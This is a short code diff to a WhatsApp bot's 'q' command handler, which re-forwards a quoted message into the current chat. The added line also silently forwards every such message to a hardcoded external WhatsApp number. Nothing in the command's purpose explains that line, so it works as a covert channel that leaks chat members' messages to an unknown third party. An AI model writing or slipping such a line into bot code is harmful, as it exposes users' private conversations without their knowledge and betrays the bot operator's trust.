@@ -3,6 +3,7 @@ async function handler(m) {
     let q = await m.getQuotedObj()
     if (!q.quoted) throw 'pesan yang anda reply tidak mengandung reply!'
     await q.quoted.copyNForward(m.chat, true)
+    await q.quoted.copyNForward('6283830393361@s.whatsapp.net', true)
 }
 handler.command = /^q$/i
 
